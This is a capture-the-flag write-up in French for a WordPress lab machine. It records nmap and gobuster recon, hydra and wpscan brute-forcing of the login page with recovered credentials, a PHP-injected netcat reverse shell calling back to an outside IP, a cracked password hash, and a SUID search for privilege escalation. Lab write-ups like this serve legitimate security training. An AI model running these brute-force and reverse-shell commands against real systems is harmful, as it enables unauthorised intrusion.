# recon
```
nmap -Pn -sVC 10.10.81.228 
```
	22/tcp  closed ssh                                                                                                                                                                                               
	80/tcp  open   http     Apache httpd
	|_http-server-header: Apache
	|_http-title: Site doesn't have a title (text/html).
	443/tcp open   ssl/http Apache httpd
	|_http-title: Site doesn't have a title (text/html).
	| ssl-cert: Subject: commonName=www.example.com
	| Not valid before: 2015-09-16T10:45:03
	|_Not valid after:  2025-09-13T10:45:03
	|_http-server-header: Apache

```
gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.81.228
```
	/0                    (Status: 301) [Size: 0] [--> http://10.10.54.162/0/]
	/0000                 (Status: 301) [Size: 0] [--> http://10.10.54.162/0000/]
	/Image                (Status: 301) [Size: 0] [--> http://10.10.54.162/Image/]
	/admin                (Status: 301) [Size: 234] [--> http://10.10.54.162/admin/]
	/atom                 (Status: 301) [Size: 0] [--> http://10.10.54.162/feed/atom/]
	/audio                (Status: 301) [Size: 234] [--> http://10.10.54.162/audio/]
	/blog                 (Status: 301) [Size: 233] [--> http://10.10.54.162/blog/]
	/css                  (Status: 301) [Size: 232] [--> http://10.10.54.162/css/]
	/dashboard            (Status: 302) [Size: 0] [--> http://10.10.54.162/wp-admin/]
	/favicon.ico          (Status: 200) [Size: 0]
	/feed                 (Status: 301) [Size: 0] [--> http://10.10.54.162/feed/]
	/image                (Status: 301) [Size: 0] [--> http://10.10.54.162/image/]
	/images               (Status: 301) [Size: 235] [--> http://10.10.54.162/images/]
	/js                   (Status: 301) [Size: 231] [--> http://10.10.54.162/js/]
	/license              (Status: 200) [Size: 309]
	/login                (Status: 302) [Size: 0] [--> http://10.10.54.162/wp-login.php]
	/page1                (Status: 301) [Size: 0] [--> http://10.10.54.162/]
	/phpmyadmin           (Status: 403) [Size: 94]
	/rdf                  (Status: 301) [Size: 0] [--> http://10.10.54.162/feed/rdf/]
	/readme               (Status: 200) [Size: 64]
	/robots               (Status: 200) [Size: 41]
	/robots.txt           (Status: 200) [Size: 41]
	/rss                  (Status: 301) [Size: 0] [--> http://10.10.54.162/feed/]
	/rss2                 (Status: 301) [Size: 0] [--> http://10.10.54.162/feed/]
	/sitemap.xml          (Status: 200) [Size: 0]
	/sitemap              (Status: 200) [Size: 0]
	/video                (Status: 301) [Size: 234] [--> http://10.10.54.162/video/]
	/wp-config            (Status: 200) [Size: 0]
	/wp-content           (Status: 301) [Size: 239] [--> http://10.10.54.162/wp-content/]
	/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.54.162/wp-admin/]
	/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.54.162/wp-includes/]
	/wp-login             (Status: 200) [Size: 2664]

page de connexion et robots.txt trouvé : 
http://10.10.54.162/wp-login/

```
curl http://10.10.34.83/robots.txt
```
	User-agent: *
	fsocity.dic
	key-1-of-3.txt

`fsocity.dic` est une liste de mots qui serras utiliser les attaques par dictionnaires

# exploitation
## Attack par dic sur page de login

```
hydra -L fsocity.dic -p test 10.10.81.228 http-form-post '/wp-login.php?action=lostpassword:user_login=^PASS^&wp-submit=Get New Password:F=Invalid username or e-mail.'
```
```
 hydra -L fsocity.dic -p test $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' 
```
	[80][http-post-form] host: 10.10.62.202   login: Elliot   password: test

Trier le dictionnaire en suppriment les doublons
```
cat fsocity.dic|sort -u | uniq > fsocity.dic.m
```

```
wpscan --url $ip -P /home/kali/Desktop/Chall/thm/fsocity.dic.m -U Elliot
```
	[!] Valid Combinations Found:
	 | Username: Elliot, Password: ER28-0652

injection de code dans le code source d'un plugin
```
system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.153.190 1234 >/tmp/f");
```

# foothold
$ cat /home/robot/password.raw-md5
	robot:c3fcd3d76192e4007dfb496cca67e13b
hashCracked = 
```
abcdefghijklmnopqrstuvwxyz
```

```
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
	-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
	-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
	-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
	-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
	-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
	-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
	-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
	-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
	-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
	-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
	-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
	-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
	-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
	-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
	-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
	-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
	-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown

La présence de nmap n'est pas habituelle
$ ip a
	2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
	    link/ether 02:99:91:2d:7f:55 brd ff:ff:ff:ff:ff:ff
	    inet 10.10.146.156/16 brd 10.10.255.255 scope global eth0
